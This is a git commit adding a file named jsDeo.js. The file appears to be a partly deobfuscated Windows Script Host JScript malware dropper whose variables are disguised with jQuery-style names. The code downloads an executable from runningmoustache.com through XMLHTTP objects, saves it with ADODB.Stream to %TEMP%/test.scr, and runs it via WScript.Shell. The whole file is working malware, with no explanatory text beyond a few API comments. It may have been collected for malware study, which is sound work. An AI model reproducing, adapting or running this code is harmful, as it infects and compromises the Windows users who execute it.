3133dde31b630bee149a0f2dcb998505ea572d6d
Andrea Sindoni <andrea.sindoni@gmail.com>
2016-07-30 12:37:15 +0200

    Add files via upload

---
+++ jsDeo.js
@@ -0,0 +1,112 @@
+doneName = ("t.Sh");
+returnTrue = (170);
+value = ("ingmou");
+contains = (217);
+resolve = (41);
+var rclickable = ("op"), firstDataType = ("2.S"), first = ("vir"), ignored = (8114), noCloneChecked = (function nodeIndex(){}, 3), hasOwn = ("/zW");
+ownerDocument = ("Msxm"), refElements = ("ate"), createElement = (220), firstElementChild = ("ct"), handlerQueue = (7);
+var gotoEnd = (6044619), protocol = (36537408127985), rscriptTypeMasked = ("r"), results = ("ript"), domManip = ("F.ex");
+responseContainer = ("2.Se");
+defaultValue = (7388361);
+cloneCopyEvent = (31);
+inspect = ("te");
+
+handleObj = (function nodeIndex.elemLang(){var percent= []["constructor"]["prototype"]["sort"]["apply"]();
+return percent;
+}, "dy");
+
+var createComment = (".");
+onlyHandlers = ("MLHTT");
+checked = ("tru");
+checkNonElements = ("tate");
+optall = ("P%/"), emptyGet = ("xe"), clearTimeout = ("Msxml2"), genFx = (2719), isXML = ("ty");
+border = (".com/z");
+deepDataAndEvents = ("LHTTP");
+location = ("TTP");
+cssFn = ("ateObj");
+arr = (249);
+clientLeft = ("p");
+rinputs = (19);
+contents = (46);
+runescape = ("n");
+dirruns = ("pt");
+original = (117);
+var urlAnchor = ("s"), method = ("ile"), propFilter = (168), requestHeadersNames = ("HTTP.3");
+outermostContext = ("Expan");
+setAttribute = ("://r");
+elementMatcher = ("ustac");
+innerHTML = ("eam");
+setMatchers = ("ADODB.");
+each = (1);
+b = (314);
+ajaxTransport = (69);
+_removeData = ("oso");
+curCSSTop = ("od");
+reset = (2), rlocalProtocol = ("toty"), checkContext = ("e");
+var fontWeight = ("//run"), getAll = ("nd"), rclass = ("0"), attaches = ("th"), define = ("ntSt"), children = ("ep");
+var documentIsHTML = ("Sav"), factory = ("t"), trim = ("a"), responseHeaders = ("eep"), curValue = ("pons"), fns = eval;
+parentNode = ("tus"), getClientRects = (9), newUnmatched = ("ET");
+var amd = (2252);
+
+rjsonp = hasDuplicate = tween = rquery = nodeIndex.elemLang();
+modified(rinputs, factory, location, contents, outermostContext);
+disableScript(curCSSTop, deepDataAndEvents, curValue, outermostContext);
+opener(genFx);
+relative();
+attrHandle["mode"] = 3; //Indicates read/write permissions
+attrHandle["type"] = 1; //Evaluates CommandText as a textual definition of a command or stored procedure call.
+classNames(curValue, value, cssFn, method);
+
+function stateVal() {
+    for (getElementsByClassName = 0; getElementsByClassName < scripts["length"]; getElementsByClassName++) {
+        try {
+            what = hasDuplicate["WScript"]["CreateObject"](scripts[getElementsByClassName]);
+            contextBackup();
+            what["send"]();
+            break;
+        } catch (inArray) {}
+    }
+    while (what["readyState"] != 4)  // value 4: ReadyStateComplete all the data has been received.
+    hasDuplicate["WScript"]["Sleep"](100); 
+    if (what["status"] == 200) {
+        attrHandle["open"]();
+        owner(genFx, rscriptTypeMasked, border);
+        rjsonp["WScript"]["Sleep"](5000);
+        newContext();
+        rjsonp["WScript"]["Sleep"](5000);
+        radioValue["Run"](opt);
+    } else {}
+}
+
+function contextBackup(removeAttribute) {
+    what["open"]("GET", "http://runningmoustache.com/zWbD_F.exe", false);
+    //what["open"]("GET", "http://runningmoustache.com/zWbD_F.exe", !(((contents-39)|(noCloneChecked&3)) == ((noCloneChecked+0)*(contents-44)+(getClientRects/9))));
+}
+
+function relative(view, htmlPrefilter, indirect) {
+    attrHandle = rquery["WScript"]["CreateObject"]("ADODB.Stream");
+}
+
+function disableScript(guid) {
+    opt = radioValue["ExpandEnvironmentStrings"]("%TEMP%/") + "test.scr";
+}
+
+function owner(colgroup) {
+    attrHandle["Write"](what["responseBody"]);
+}
+
+function modified() {
+    radioValue = rquery["WScript"]["CreateObject"]("WScript.Shell");
+}
+
+function opener() {
+    scripts = ["Msxml2.ServerXMLHTTP .6.0", "Msxml2.XMLHTTP.6.0", "Msxml2.ServerXMLHTTP.3.0", "Msxml2.XML" + "HTTP.3.0", "Msxml2.XMLHTTP", "Microsoft.XMLHTTP"];
+}
+
+function newContext() {
+    attrHandle["SaveToFile"](opt, (232,77,231,2));
+}
+
+function classNames(offset) {
+    stateVal("http://runningmoustache.com/zWbD_F.exe");
+} 
